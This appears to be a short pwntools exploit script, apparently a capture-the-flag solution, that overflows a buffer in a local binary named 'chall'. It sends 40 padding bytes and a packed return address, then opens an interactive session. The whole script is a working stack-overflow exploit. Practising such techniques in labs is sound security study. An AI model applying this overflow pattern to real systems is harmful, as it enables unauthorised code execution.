from pwn import *

io = process("./chall")

io.sendafter("> ", b"\x41"*40 + p64(0x0000000000401369))

io.interactive()
